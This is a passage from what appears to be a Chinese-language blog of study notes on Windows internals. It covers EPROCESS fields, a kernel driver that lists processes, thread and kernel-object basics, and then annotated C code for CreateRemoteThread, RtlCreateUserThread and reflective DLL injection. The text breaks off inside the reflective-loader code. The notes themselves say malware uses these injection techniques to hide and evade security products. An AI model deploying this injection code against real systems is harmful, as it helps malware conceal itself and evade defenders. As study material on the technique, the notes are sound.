class=\"line\">+0x1d0 OtherTransferCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1d8 CommitChargeLimit : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1dc CommitChargePeak : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1e0 AweInfo : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1e4 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1e8 Vm : _MMSUPPORT</span><br><span class=\"line\"></span><br><span class=\"line\">+0x230 MmProcessLinks : _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x238 ModifiedPageCount : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x23c JobStatus : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Flags : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 CreateReported : Pos 0, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 NoDebugInherit : Pos 1, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 ProcessExiting : Pos 2, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 ProcessDelete : Pos 3, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Wow64SplitPages : Pos 4, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 VmDeleted : Pos 5, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 OutswapEnabled : Pos 6, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Outswapped : Pos 7, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 ForkFailed : Pos 8, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Wow64VaSpace4Gb : Pos 9, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 SetTimerResolution : Pos 12, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 BreakOnTermination : Pos 13, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 SessionCreationUnderway : Pos 14, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 WriteWatch : Pos 15, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 ProcessInSession : Pos 16, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 HasAddressSpace : Pos 18, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 LaunchPrefetched : Pos 19, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 InjectInpageErrors : Pos 20, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 VmTopDown : Pos 21, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 ImageNotifyDone : Pos 22, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 PdeUpdateNeeded : Pos 23, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 VdmAllowed : Pos 24, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 SmapAllowed : Pos 25, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 CreateFailed : Pos 26, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 DefaultIoPriority : Pos 27, 3 Bits</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Spare1 : Pos 30, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x240 Spare2 : Pos 31, 1 Bit</span><br><span class=\"line\"></span><br><span class=\"line\">+0x244 ExitStatus : Int4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x248 NextPageColor : Uint2B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x24a SubSystemMinorVersion : UChar</span><br><span class=\"line\"></span><br><span class=\"line\">+0x24b SubSystemMajorVersion : UChar</span><br><span class=\"line\"></span><br><span class=\"line\">+0x24a SubSystemVersion : Uint2B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x24c PriorityClass : UChar</span><br><span class=\"line\"></span><br><span class=\"line\">+0x250 VadRoot : _MM_AVL_TABLE</span><br><span class=\"line\"></span><br><span class=\"line\">+0x270 Cookie : Uint4B</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/*</span><br><span class=\"line\">思路，先通过EPROCESS找到PsActiveProcessLinks，然后遍历所有进程，进程名在ImageFileName</span><br><span class=\"line\">*/</span><br><span class=\"line\">#include &lt;ntddk.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS TraverseProcess()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUCHAR *eprocess = (UCHAR *)PsGetCurrentProcess();//获取了EPROCESS的指针 PsActiveProcessLinks在offset0x088处</span><br><span class=\"line\">\tLIST_ENTRY *pFirstEntry = (LIST_ENTRY *)((UCHAR *)eprocess + 0x88);//获取PsActiveProcessLinks的指针</span><br><span class=\"line\">\tLIST_ENTRY *activeList = pFirstEntry;</span><br><span class=\"line\">\tUCHAR ImageFileName[16];</span><br><span class=\"line\">\tmemset(ImageFileName, 0, sizeof(ImageFileName));</span><br><span class=\"line\"></span><br><span class=\"line\">\tDbgPrint(&quot;address of EPROCESS : %X&quot;, eprocess);</span><br><span class=\"line\"></span><br><span class=\"line\">\tdo &#123;</span><br><span class=\"line\">\t\tmemcpy(ImageFileName, (UCHAR *)eprocess + 0x174, sizeof(ImageFileName));</span><br><span class=\"line\">\t\tDbgPrint(&quot;%s, %x, %x&quot;, ImageFileName,activeList-&gt;Flink,activeList-&gt;Blink);</span><br><span class=\"line\">\t\tactiveList = activeList-&gt;Flink;//寻址到下一个链表的表头</span><br><span class=\"line\">\t\teprocess = (UCHAR *)activeList - 0x88;</span><br><span class=\"line\">\t&#125; while (pFirstEntry-&gt;Flink != activeList-&gt;Flink);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\treturn STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void Unload(PDRIVER_OBJECT pDriverObject)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUNREFERENCED_PARAMETER(pDriverObject);</span><br><span class=\"line\">\tDbgPrint(&quot;unloading...&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING registryPath)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tUNREFERENCED_PARAMETER(pDriverObj);</span><br><span class=\"line\">\tUNREFERENCED_PARAMETER(registryPath);</span><br><span class=\"line\">\tUNICODE_STRING success = RTL_CONSTANT_STRING(L&quot;success&quot;);</span><br><span class=\"line\">\tUNICODE_STRING fail = RTL_CONSTANT_STRING(L&quot;failed&quot;);</span><br><span class=\"line\">\tif (TraverseProcess()) &#123;</span><br><span class=\"line\">\t\tDbgPrint(&quot;%wZ&quot;, &amp;success);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpDriverObj-&gt;DriverUnload = Unload;</span><br><span class=\"line\">\tDbgPrint(&quot;%wZ&quot;, &amp;fail);</span><br><span class=\"line\">\treturn STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"线程\"><a class=\"markdownIt-Anchor\" href=\"#线程\">#</a> 线程</h3>\n<ol>\n<li>\n<p>线程的创建其实和进程类似，也是建立起来线程的执行环境，比如分配线程所需要的数据结构和调用栈，完成这些数据结构的初始化操作。虽然这些操作比较于进程是很轻量级的，但是频繁创建和销毁也会是不可忽视的消耗。所以当需要频繁创建和销毁线程的时候，可以考虑线程池式的方式来解决消耗过大的问题。</p>\n<p>进程中的多个线程执行的时候，是乱序的，即在某个时刻执行哪个线程，是不确定的，所以多线程的问题会比较难以调试。对于线程来说，是有用户态和内核态的区别，当进行线程切换的时候，如果线程是用户态，是需要切换为内核态的，这种切换也是需要耗费资源，不过目前随着硬件的发展，这部分切换的成本正在减少，所以，这部分的开销是可以接受的，大部分情况下，我们可以忽略线程的切换。</p>\n</li>\n<li></li>\n</ol>\n<p>一个多线程程序有多个执行点，在多处理器的机器上，不同的线程会真的存在；而在单处理器的机器上，系统采用一种分时技术来将每个线程切割成较短的时间间隔，一个线程执行时便暂停其它线程，给每个线程一些处理时间，这些时间是非常短的，在用户看来就像是程序支持多线程操作。</p>\n<p>因为有了多线程，所以我们可以一边听音乐，一边编辑文档，或是一边聊微信。</p>\n<p>若一个程序不支持多线程，当用户执行一个操作，若有别的操作还在运行，程序便会出现无响应，程序不应该允许这种情况发生。</p>\n<p>但是线程一旦共享资源就会出现同步问题，因为任何线程都会被其它线程中断，所以使用线程并不难，重点是是如何同步对象来安全的共享资源。</p>\n<p>!teb   查看线程环境链</p>\n<h3 id=\"内核\"><a class=\"markdownIt-Anchor\" href=\"#内核\">#</a> 内核</h3>\n<ol>\n<li>对象是一种特殊的数据结构，用于定于受保护的实体。为了让系统高效稳定的运行，在 Windows 内核中空间中保存了多种不同的对象。例如：在用户层使用 CreateProcess 创建进程以后，Windows 系统就会在内核中创建一个进程对象用来保存进程的信息（进程名，PID 等等），有了这些信息 Windows 就可以方便的对进程进行管理。这些内核对象是保存在内核空间中的，用户层的程序是无法通过地址直接访问这些对象。想要访问这些内核对象，就需要使用 Windows 提供的句柄。在用户层如果想做什么样的操作，就可以通过句柄进行操作，因为在内核层会通过该句柄找到相应的内核对象完成操作。通过这样的设计，用户层的代码就无法直接内核层的数据，对重要的数据的一些关键操作就会由内核来完成，增强了系统的健壮性。</li>\n<li>对象管理器是执行体的组件，主要管理执行体对象。但是，执行体对象也可能封装了一个或多个内核对象。因此，Windows 对象管理器的作用可以认为是对内核空间中多种多样的不同内核对象进行控制。</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/432ea42769ff4225b6a3eb7a4b83692f.jpg\" alt=\"img\"></p>\n<p>内核是从 0x80000000 开始 ，0x7fffffff 之前的是用户态空间</p>\n<h3 id=\"进程注入\"><a class=\"markdownIt-Anchor\" href=\"#进程注入\">#</a> 进程注入</h3>\n<p>Windows 平台下的进程注入技术一直以来都是一个被人深入研究的话题，并且目前已经拥有许多技术去将数据从一个进程注入到其他进程当中。恶意代码是最常用这种技术去进行敏感操作，以达到隐藏自身，绕过安全产品检测的目的。为了能够全面了解这项技术，曾经在某大会上所讨论的一个主题，该主题包含了尽可能所有的已知并且在当前环境 (Win10) 下可用的注入技术，并进行了总结</p>\n<p>隐藏自身  隐藏敏感操作</p>\n<p>CFG Windows 漏洞缓解措施，在 call eax 之前加个验证</p>\n<p>call __security_init_cookie  防溢出</p>\n<h4 id=\"createremotethread\"><a class=\"markdownIt-Anchor\" href=\"#createremotethread\">#</a> CreateRemoteThread</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);</span><br><span class=\"line\"> </span><br><span class=\"line\">    // 获取传递进程ID的进程句柄</span><br><span class=\"line\">    HANDLE hProcess = OpenProcess(</span><br><span class=\"line\">        PROCESS_QUERY_INFORMATION |</span><br><span class=\"line\">        PROCESS_CREATE_THREAD |</span><br><span class=\"line\">        PROCESS_VM_OPERATION |</span><br><span class=\"line\">        PROCESS_VM_WRITE,//目标进程的四个权限</span><br><span class=\"line\">        FALSE, dwProcessId);</span><br><span class=\"line\"> </span><br><span class=\"line\">    // 在远程进程中为路径名分配空间</span><br><span class=\"line\">    LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    // 将DLL的路径名复制到远程进程地址空间</span><br><span class=\"line\">    //pszLibFile：要注入的dll的路径  pathname</span><br><span class=\"line\">    DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\">    //在Kernel32.dll中获取LoadLibraryW的实际地址</span><br><span class=\"line\">    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;LoadLibraryW&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    //创建一个调用LoadLibraryW（DLLPathname）的远程线程</span><br><span class=\"line\">    // CreateRemoteThread(目标进程句柄，NULL，0，线程函数指针，线程函数参数，0，NULL)</span><br><span class=\"line\">    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    // 等待远程线程终止</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\"> </span><br><span class=\"line\">    // 释放包含DLL路径名的远程内存并关闭句柄</span><br><span class=\"line\">    if (pszLibFileRemote != NULL) //开辟的内存已经注入进数据</span><br><span class=\"line\">        VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);</span><br><span class=\"line\">    //关闭线程和进程函数句柄</span><br><span class=\"line\">    if (hThread != NULL)</span><br><span class=\"line\">        CloseHandle(hThread);</span><br><span class=\"line\"> </span><br><span class=\"line\">    if (hProcess != NULL)</span><br><span class=\"line\">        CloseHandle(hProcess);</span><br><span class=\"line\"> </span><br><span class=\"line\">    return(0);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关键函数：</p>\n<p>VirtualAllocEx</p>\n<p>WriteProcessMemory</p>\n<p>GetProcAddress</p>\n<p>CreateRemoteThread</p>\n<h4 id=\"rtlcreateuserthread类型注入\"><a class=\"markdownIt-Anchor\" href=\"#rtlcreateuserthread类型注入\">#</a> RtlCreateUserThread 类型注入</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(L&quot;ntdll.dll&quot;), &quot;RtlCreateUserThread&quot;);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">    wprintf(TEXT(&quot;[+] Found at 0x%08x\\n&quot;), (UINT)RtlCreateUserThread);</span><br><span class=\"line\">    wprintf(TEXT(&quot;[+] Found at 0x%08x\\n&quot;), (UINT)LoadLibraryAddress);</span><br><span class=\"line\">#endif</span><br><span class=\"line\"> </span><br><span class=\"line\">    DWORD dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);</span><br><span class=\"line\"> </span><br><span class=\"line\">    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    BOOL bStatus = WriteProcessMemory(hProcess, lpBaseAddress, pszLibFile, dwSize, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">    bStatus = (BOOL)RtlCreateUserThread(</span><br><span class=\"line\">        hProcess,</span><br><span class=\"line\">        NULL,</span><br><span class=\"line\">        0,</span><br><span class=\"line\">        0,</span><br><span class=\"line\">        0,</span><br><span class=\"line\">        0,</span><br><span class=\"line\">        LoadLibraryAddress,</span><br><span class=\"line\">        lpBaseAddress,</span><br><span class=\"line\">        &amp;hRemoteThread,</span><br><span class=\"line\">        NULL);</span><br><span class=\"line\">    if (bStatus &lt; 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        wprintf(TEXT(&quot;[-] Error: RtlCreateUserThread failed\\n&quot;));</span><br><span class=\"line\">        return(1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        wprintf(TEXT(&quot;[+] Remote thread has been created successfully ...\\n&quot;));</span><br><span class=\"line\">        WaitForSingleObject(hRemoteThread, INFINITE);</span><br><span class=\"line\"> </span><br><span class=\"line\">        CloseHandle(hProcess);</span><br><span class=\"line\">        VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);</span><br><span class=\"line\">        return(0);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    return(0);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"反射式dll注入\"><a class=\"markdownIt-Anchor\" href=\"#反射式dll注入\">#</a> 反射式 dll 注入</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extern &quot;C&quot; HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter);</span><br><span class=\"line\"> </span><br><span class=\"line\">DWORD demoReflectiveDllInjection(PCWSTR cpDllFile, DWORD dwProcessId)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hFile = NULL;//创建的dll文件句柄</span><br><span class=\"line\">    HANDLE hModule = NULL;//开辟的堆空间句柄</span><br><span class=\"line\">    HANDLE hProcess = NULL;//目标进程句柄</span><br><span class=\"line\">    LPVOID lpBuffer = NULL;</span><br><span class=\"line\">    DWORD dwLength = 0;</span><br><span class=\"line\">    DWORD dwBytesRead = 0;</span><br><span class=\"line\"> </span><br><span class=\"line\">    do</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        hFile = CreateFileW(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">        dwLength = GetFileSize(hFile, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">#ifdef _DEBUG</span><br><span class=\"line\">        wprintf(TEXT(&quot;[+] File Size: %d\\n&quot;), dwLength);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">        //为dll文件开辟堆空间 ！！！！！！！！这是在自己的进程内存中  分配堆内存</span><br><span class=\"line\">        lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);</span><br><span class=\"line\"> </span><br><span class=\"line\">        //将dll文件读进开辟的堆空间中 hfile--》lpbuffer</span><br><span class=\"line\">        if (ReadFile(hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL) == FALSE) BREAK_WITH_ERROR(&quot;[-] Failed to alloc a buffer!&quot;);</span><br><span class=\"line\">        //获得目标进程的句柄</span><br><span class=\"line\">        hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);</span><br><span class=\"line\"> </span><br><span class=\"line\">        // LoadRemoteLibraryR：在dll模块加载到内存时获取入口点,并且实现调用该函数（采用rtlcreateuserthread的方式）远程线程注入</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">        hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">        WaitForSingleObject(hModule, -1);</span><br><span class=\"line\"> </span><br><span class=\"line\">    &#125; while (0);</span><br><span class=\"line\"> </span><br><span class=\"line\">    //注入完毕，释放堆空间，关闭进程句柄</span><br><span class=\"line\">    if (lpBuffer) HeapFree(GetProcessHeap(), 0, lpBuffer);</span><br><span class=\"line\"> </span><br><span class=\"line\">    if (hProcess) CloseHandle(hProcess);</span><br><span class=\"line\"> </span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">            //检查库是否有ReflectiveLoader</span><br><span class=\"line\"> </span><br><span class=\"line\">            // 获得dll文件的入口点偏移</span><br><span class=\"line\">            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);//lpbuffer:堆内存的指针 指向存有dll文件的堆内存空间</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            // alloc memory (RWX) in the host process for the image...</span><br><span class=\"line\">            //为映像分配内存</span><br><span class=\"line\">            lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            // write the image into the host process...</span><br><span class=\"line\">            //将映像写入目标进程</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            /*</span><br><span class=\"line\">            BOOL WriteProcessMemory(</span><br><span class=\"line\">            HANDLE hProcess,</span><br><span class=\"line\">                LPVOID lpBaseAddress, 要写的内存首地址</span><br><span class=\"line\">                LPVOID lpBuffer, 指向要写的数据的指针</span><br><span class=\"line\">                DWORD nSize,</span><br><span class=\"line\">                LPDWORD lpNumberOfBytesWritten</span><br><span class=\"line\">                );</span><br><span class=\"line\">                */</span><br><span class=\"line\"> </span><br><span class=\"line\">                //将映像写入目标进程  lpRemoteLibraryBuffer  在目标进程中分配的内存空间 lpBuffer在该进程内存空间中分配的堆内存</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">            // add the offset to ReflectiveLoader() to the remote library address...</span><br><span class=\"line\">            //lpRemoteLibraryBuffer 